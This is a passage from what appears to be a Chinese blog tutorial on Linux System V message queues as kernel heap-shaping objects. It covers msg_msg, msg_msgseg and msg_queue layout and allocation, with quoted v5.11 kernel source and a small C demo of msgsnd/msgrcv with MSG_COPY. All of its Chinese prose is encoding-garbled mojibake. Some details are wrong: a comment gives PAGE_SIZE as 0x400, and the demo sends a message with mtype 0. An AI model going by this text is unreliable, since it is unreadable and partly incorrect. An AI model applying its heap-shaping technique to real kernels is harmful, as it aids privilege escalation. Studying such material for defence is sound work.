<p>å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</p>
<ul>
<li>åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>mtype</code>ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤<code>mtype</code>æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶</li>
<li>åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>msgtyp</code>ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ<ul>
<li><code>msgtyp</code>å¤§äº0ï¼šé‚£ä¹ˆåœ¨<code>find_msg</code>å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº<code>msgtyp</code>çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚</li>
<li><code>msgtyp</code>ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ<code>find_msg</code>å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚</li>
<li><code>msgtyp</code>å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ<code>mtype</code>çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>å¯ä»¥å…³æ³¨ä¸€ä¸‹<code>MSG_NOERROR</code>æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´<code>msg_flag</code>æ²¡æœ‰è®¾ç½®<code>MSG_NOERROR</code>çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦<code>m_ts_size</code>ä¸º<code>0x200</code>ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>ä½†æ˜¯å¦‚æœè®¾ç½®äº†<code>MSG_NOERROR</code>ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>msg_flag</code>ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p>

        <h4 id="â‘¢é‡Šæ”¾"   >
          <a href="#â‘¢é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é‡Šæ”¾" class="headerlink" title="â‘¢é‡Šæ”¾"></a>â‘¢é‡Šæ”¾</h4>
      <p>è¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°<code>msgctl</code>å°è£…å‡½æ•°æˆ–è€…<code>__NR_msgctl</code>ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„<code>msg_queue</code>çš„ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id,IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?</p>
<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>cmd</code>å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>

        <h4 id="æ€»ç»“"   >
          <a href="#æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4>
      <p>æ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ›å»º-1"   >
          <a href="#â‘ åˆ›å»º-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-1" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      
        <h5 id="A-å†…å­˜ç”³è¯·"   >
          <a href="#A-å†…å­˜ç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <ul>
<li><p>è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º<code>msg_queue</code>ç»“æ„ä½“ï¼Œä½¿ç”¨<code>msgget</code>å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„<code>newque()</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨<code>kvmalloc()</code>ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº<code>kmalloc-256</code>ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//è¿›è¡Œç›¸å…³æ³¨å†Œ</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF</span></span><br><span class="line">    <span class="comment">//å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>æ¥ç€å½“ä½¿ç”¨<code>msgsnd</code>å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„<code>msg_msg</code>ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„<code>msg_msgseg</code>æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨<code>alloc_msg()</code>å‡½æ•°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//ä½¿ç”¨æ­£å¸¸</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚</span></span><br><span class="line">    <span class="comment">//ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚</span></span><br><span class="line">    <span class="comment">//æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024</span></span><br><span class="line">    <span class="comment">//è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//ä¸çŸ¥é“å¹²å•¥çš„</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg-&gt;nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª<code>struct msg_msgseg*</code>æŒ‡é’ˆ</p>
